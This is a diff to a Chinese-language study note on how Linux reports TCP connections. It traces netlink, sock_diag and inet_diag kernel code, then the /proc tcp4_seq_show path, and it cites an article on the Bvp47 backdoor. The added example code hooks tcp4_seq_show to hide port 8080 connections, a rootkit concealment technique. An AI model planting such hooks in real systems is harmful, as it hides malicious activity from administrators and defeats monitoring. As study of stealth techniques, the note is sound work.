@@ -621,7 +621,10 @@ int main() {
 
 ### netlink分析
 
+netlink初始化
+
 /net/netlink/af_netlink.c:
+
 ```c
 static const struct net_proto_family netlink_family_ops = {
 	.family = PF_NETLINK,
@@ -659,7 +662,7 @@ static void __init netlink_add_usersock_entry(void)
 }
 ```
 
-然后用户通过socket创建AF_NETLINK套接字时：
+用户通过socket创建AF_NETLINK套接字时：
 
 ```c
 // 创建 netlink 套接字
@@ -735,7 +738,9 @@ static int __netlink_create(struct net *net, struct socket *sock,
 
 ```
 
-可以通过netlink_kernel_create函数，找到内核所有的注册的netlink接口
+完成创建后，该socket的ops为netlink_ops,protocol 为AF_NETLINK
+
+Tips：可以通过netlink_kernel_create函数，找到内核所有的注册的netlink接口
 
 通过 strace 命令：
 
@@ -765,6 +770,23 @@ static int __net_init diag_net_init(struct net *net)
 	net->diag_nlsk = netlink_kernel_create(net, NETLINK_SOCK_DIAG, &cfg);
 	return net->diag_nlsk == NULL ? -ENOMEM : 0;
 }
+
+struct sock *
+__netlink_kernel_create(struct net *net, int unit, struct module *module,
+			struct netlink_kernel_cfg *cfg)
+{
+...
+	if (cfg && cfg->input)
+		nlk_sk(sk)->netlink_rcv = cfg->input;
+...
+		if (cfg) {
+			nl_table[unit].bind = cfg->bind;
+			nl_table[unit].unbind = cfg->unbind;
+			nl_table[unit].release = cfg->release;
+			nl_table[unit].flags = cfg->flags;
+		}
+...
+}
 ```
 
 调用sendmsg会到netlink_sendmsg
@@ -783,9 +805,264 @@ static int netlink_sendmsg(struct socket *sock, struct msghdr *msg, size_t len)
 
 ...
 }
+
+int netlink_unicast(struct sock *ssk, struct sk_buff *skb,
+		    u32 portid, int nonblock)
+{
+...
+	if (netlink_is_kernel(sk))
+		return netlink_unicast_kernel(sk, skb, ssk);
+...
+}
+
+static int netlink_unicast_kernel(struct sock *sk, struct sk_buff *skb,
+				  struct sock *ssk)
+{
+...
+	if (nlk->netlink_rcv != NULL) {
+	...
+		nlk->netlink_rcv(skb);
+	...
+	}
+...
+}
 ```
 
-最终获取ip端口等信息的netlink会调用到sock_diag_rcv。
+最终获取ip端口等信息的netlink会调用到sock_diag_rcv。其中我们只需要关注nlh->nlmsg_type == SOCK_DIAG_BY_FAMILY
+
+net/core/sock_diag.c:
+```c
+static int sock_diag_rcv_msg(struct sk_buff *skb, struct nlmsghdr *nlh,
+			     struct netlink_ext_ack *extack)
+{
+...
+	case SOCK_DIAG_BY_FAMILY:
+	case SOCK_DESTROY:
+		return __sock_diag_cmd(skb, nlh);
+...
+}
+```
+
+net/core/sock_diag.c:
+```c
+static const struct sock_diag_handler *sock_diag_lock_handler(int family)
+{
+	const struct sock_diag_handler *handler;
+
+	rcu_read_lock();
+	handler = rcu_dereference(sock_diag_handlers[family]);
+	if (handler && !try_module_get(handler->owner))
+		handler = NULL;
+	rcu_read_unlock();
+
+	return handler;
+}
+
+static int __sock_diag_cmd(struct sk_buff *skb, struct nlmsghdr *nlh)
+{
+	int err;
+	struct sock_diag_req *req = nlmsg_data(nlh);
+	const struct sock_diag_handler *hndl;
+...
+	req->sdiag_family = array_index_nospec(req->sdiag_family, AF_MAX);
+	hndl = sock_diag_lock_handler(req->sdiag_family);
+...
+		if (nlh->nlmsg_type == SOCK_DIAG_BY_FAMILY)
+			err = hndl->dump(skb, nlh);
+...
+}
+```
+
+此时我们的req->sdiag_family为AF_INET，通过函数sock_diag_register可以查看到对应的handler
+
+```c
+static const struct sock_diag_handler inet_diag_handler = {
+	.owner = THIS_MODULE,
+	.family = AF_INET,
+	.dump = inet_diag_handler_cmd,
+	.get_info = inet_diag_handler_get_info,
+	.destroy = inet_diag_handler_cmd,
+};
+```
+
+则对应的hndl->dump(skb, nlh) 为 inet_diag_handler_cmd:
+
+Net/ipv4/inet_diag.c:
+
+```c
+static int inet_diag_handler_cmd(struct sk_buff *skb, struct nlmsghdr *h)
+{
+	int hdrlen = sizeof(struct inet_diag_req_v2);
+	struct net *net = sock_net(skb->sk);
+...
+	if (h->nlmsg_type == SOCK_DIAG_BY_FAMILY &&
+	    h->nlmsg_flags & NLM_F_DUMP) {
+		struct netlink_dump_control c = {
+			.start = inet_diag_dump_start,
+			.done = inet_diag_dump_done,
+			.dump = inet_diag_dump,
+		};
+		return netlink_dump_start(net->diag_nlsk, skb, h, &c);
+...
+}
+
+static int inet_diag_dump(struct sk_buff *skb, struct netlink_callback *cb)
+{
+	return __inet_diag_dump(skb, cb, nlmsg_data(cb->nlh));
+}
+
+static int __inet_diag_dump(struct sk_buff *skb, struct netlink_callback *cb,
+			    const struct inet_diag_req_v2 *r)
+{
+	struct inet_diag_dump_data *cb_data = cb->data;
+	const struct inet_diag_handler *handler;
+	u32 prev_min_dump_alloc;
+	int protocol, err = 0;
+
+	protocol = inet_diag_get_protocol(r, cb_data);
+...
+	handler = inet_diag_lock_handler(protocol);
+...
+	handler->dump(skb, cb, r);
+...
+}
+```
+
+通过inet_diag_register函数找到 tcp对应的handler为：
+
+net/ipv4/tcp_diag.c:
+```c
+static const struct inet_diag_handler tcp_diag_handler = {
+	.owner			= THIS_MODULE,
+	.dump			= tcp_diag_dump,
+	.dump_one		= tcp_diag_dump_one,
+	.idiag_get_info		= tcp_diag_get_info,
+	.idiag_get_aux		= tcp_diag_get_aux,
+	.idiag_get_aux_size	= tcp_diag_get_aux_size,
+	.idiag_type		= IPPROTO_TCP,
+	.idiag_info_size	= sizeof(struct tcp_info),
+#ifdef CONFIG_INET_DIAG_DESTROY
+	.destroy		= tcp_diag_destroy,
+#endif
+};
+
+
+static void tcp_diag_dump(struct sk_buff *skb, struct netlink_callback *cb,
+			  const struct inet_diag_req_v2 *r)
+{
+	struct inet_hashinfo *hinfo;
+
+	hinfo = sock_net(cb->skb->sk)->ipv4.tcp_death_row.hashinfo;
+
+	inet_diag_dump_icsk(hinfo, skb, cb, r);
+}
+```
+
+/net/ipv4/inet_diag.c:
+
+```c
+void inet_diag_dump_icsk(struct inet_hashinfo *hashinfo, struct sk_buff *skb,
+			 struct netlink_callback *cb,
+			 const struct inet_diag_req_v2 *r)
+{
+...
+				if (inet_sk_diag_fill(sk, inet_csk(sk), skb,
+						      cb, r, NLM_F_MULTI,
+						      net_admin) < 0) {
+					spin_unlock(&ilb->lock);
+					goto done;
+				}
+...
+					res = inet_sk_diag_fill(sk_arr[idx],
+								NULL, skb, cb,
+								r, NLM_F_MULTI,
+								net_admin);
+...
+				res = sk_diag_fill(sk_arr[idx], skb, cb, r,
+						   NLM_F_MULTI, net_admin);
+...
+}
+```
+
+关键函数为inet_sk_diag_fill、inet_sk_diag_fill、sk_diag_fill
+
+### 通过/proc/net/ipv4获取连接信息
+
+需要hook tcp4_seq_show函数
+
+```c
+static const struct seq_operations tcp4_seq_ops = {
+	.show		= tcp4_seq_show,
+	.start		= tcp_seq_start,
+	.next		= tcp_seq_next,
+	.stop		= tcp_seq_stop,
+};
+
+static struct tcp_seq_afinfo tcp4_seq_afinfo = {
+	.family		= AF_INET,
+};
+
+static int __net_init tcp4_proc_init_net(struct net *net)
+{
+	if (!proc_create_net_data("tcp", 0444, net->proc_net, &tcp4_seq_ops,
+			sizeof(struct tcp_iter_state), &tcp4_seq_afinfo))
+		return -ENOMEM;
+	return 0;
+}
+
+static void __net_exit tcp4_proc_exit_net(struct net *net)
+{
+	remove_proc_entry("tcp", net->proc_net);
+}
+
+static struct pernet_operations tcp4_net_ops = {
+	.init = tcp4_proc_init_net,
+	.exit = tcp4_proc_exit_net,
+};
+
+int __init tcp4_proc_init(void)
+{
+	return register_pernet_subsys(&tcp4_net_ops);
+}
+
+void tcp4_proc_exit(void)
+{
+	unregister_pernet_subsys(&tcp4_net_ops);
+}
+```
+
+eg:
+
+```c
+/*
+ * Usual function declaration for the real tcp4_seq_show
+ */
+static asmlinkage long (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
+
+/*
+ * Function hook for tcp4_seq_show()
+ */
+static asmlinkage long hook_tcp4_seq_show(struct seq_file *seq, void *v)
+{
+    struct sock *sk = v;
+
+    /*
+     * Check if sk_num is 8080
+     * (0x1f90 = 8080 in hex)
+     * If sk doesn't point to anything, then it points to 0x1
+     */
+    if (sk != 0x1 && sk->sk_num == 0x1f90)
+        return 0;
+
+    /*
+     * Otherwise, just return with the real tcp4_seq_show()
+     */
+    return orig_tcp4_seq_show(seq, v);
+}
+```
+
+
+
 
 # 参考资料
 
@@ -818,3 +1095,7 @@ https://www.anquanke.com/post/id/288932
 Netlink Communication between Kernel and User space
 
 https://dev.to/zqiu/netlink-communication-between-kernel-and-user-space-2mg1
+
+美国NSA超级后门`Bvp47`的隐身技能：网络隐身1
+
+https://www.freebuf.com/articles/system/365376.html
